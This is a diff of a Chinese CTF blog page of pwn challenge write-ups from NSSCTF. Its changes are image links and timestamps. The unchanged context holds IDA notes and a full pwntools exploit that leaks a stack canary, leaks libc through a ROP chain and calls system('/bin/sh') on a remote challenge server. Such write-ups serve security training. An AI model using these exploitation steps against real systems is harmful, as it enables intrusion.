@@ -30,14 +30,14 @@
 <meta property="og:description" content="这是一个记录在NSSCTF平台上刷pwn题的博客，题目顺序按照刷题的先后顺序">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png">
-<meta property="og:image" content="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/spub8xbz8oe263t2gjkadvuj/5.png">
 <meta property="og:image" content="http://static.zybuluo.com/hgggg/dqyexxjen9e2l5hdeapnnpap/3.png">
 <meta property="og:image" content="http://static.zybuluo.com/hgggg/nq6c5o48hap4cvvg7iz1vlj1/4.png">
-<meta property="og:image" content="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png">
-<meta property="og:image" content="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png">
-<meta property="og:image" content="http://static.zybuluo.com/hgggg/dqyexxjen9e2l5hdeapnnpap/3.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/hp8iw26kpnaymkagp0xsst0w/6.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/bv44ppcn4yc9olz9cynvwj7p/1.jpg">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/qun6tu6uu3anokwgsiox0jt0/image_1fhpqrsetl1s19a1ipo1qf8s05l.png">
 <meta property="article:published_time" content="2021-10-04T08:32:39.000Z">
-<meta property="article:modified_time" content="2021-10-12T08:49:04.376Z">
+<meta property="article:modified_time" content="2021-10-12T14:55:27.811Z">
 <meta property="article:author" content="haruki">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
@@ -243,7 +243,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-10-12 16:49:04" itemprop="dateModified" datetime="2021-10-12T16:49:04+08:00">2021-10-12</time>
+        <time title="修改时间：2021-10-12 22:55:27" itemprop="dateModified" datetime="2021-10-12T22:55:27+08:00">2021-10-12</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -310,7 +310,7 @@
 <h2 id="CISCN-2019东北-PWN3"><a class="header-anchor" href="#CISCN-2019东北-PWN3">¶</a>CISCN 2019东北 PWN3</h2>
 <h3 id="IDA-分析"><a class="header-anchor" href="#IDA-分析">¶</a>IDA 分析</h3>
 <p>main函数</p>
-<p><img src="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png" alt="5.png-36.5kB"></p>
+<p><img src="http://static.zybuluo.com/hgggg/spub8xbz8oe263t2gjkadvuj/5.png" alt="5.png-36.5kB"></p>
 <p>print_chk()明显是个格式化字符串</p>
 <p>这个题能用的函数就两个</p>
 <p>add</p>
@@ -429,7 +429,7 @@ Step1: 获得key<br>
 <h3 id="IDA-分析-v2"><a class="header-anchor" href="#IDA-分析-v2">¶</a>IDA 分析</h3>
 <p>本题功能add,show,edit,delete一应俱全</p>
 <p>漏洞点在add函数中</p>
-<p><img src="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png" alt="6.png-37.4kB"></p>
+<p><img src="http://static.zybuluo.com/hgggg/hp8iw26kpnaymkagp0xsst0w/6.png" alt="6.png-37.4kB"></p>
 <p>add 函数用一个数组来储存size，<strong>而且在进入检查之前就会对数组中的值赋值</strong>，这就意味着我可以利用这点来修改已经申请到的堆块的大小造成堆溢出</p>
 <h3 id="解题思路"><a class="header-anchor" href="#解题思路">¶</a>解题思路</h3>
 <p>Step1: leak libc<br>
@@ -466,8 +466,8 @@ canary
 </code></pre>
 <h3 id="题目分析-v4"><a class="header-anchor" href="#题目分析-v4">¶</a>题目分析</h3>
 <p>题目存在canary</p>
-<p><img src="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png" alt="1.jpg-7.4kB"><br>
-<img src="http://static.zybuluo.com/hgggg/dqyexxjen9e2l5hdeapnnpap/3.png" alt="image_1fhpqrsetl1s19a1ipo1qf8s05l.png-4kB"></p>
+<p><img src="http://static.zybuluo.com/hgggg/bv44ppcn4yc9olz9cynvwj7p/1.jpg" alt="1.jpg-7.4kB"><br>
+<img src="http://static.zybuluo.com/hgggg/qun6tu6uu3anokwgsiox0jt0/image_1fhpqrsetl1s19a1ipo1qf8s05l.png" alt="image_1fhpqrsetl1s19a1ipo1qf8s05l.png-4kB"></p>
 <p>通过IDA分析可以得到canary的位置在距buf的0x48处，即只要padding0x48个字节就能得到canary剩下的就是基操了</p>
 <h3 id="exp-v11"><a class="header-anchor" href="#exp-v11">¶</a>exp</h3>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;littleof&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28147</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;littleof&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x000000000040059e</span></span><br><span class="line">pop_rdi =<span class="number">0x0000000000400863</span></span><br><span class="line">main = <span class="number">0x4006E2</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">canary = canary &amp; <span class="number">0XFFFFFFFFFFFFFFF0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">binsh = libc_base + <span class="number">0x00000000001b3e1a</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">canary = canary &amp; <span class="number">0XFFFFFFFFFFFFFFF0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret) +p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
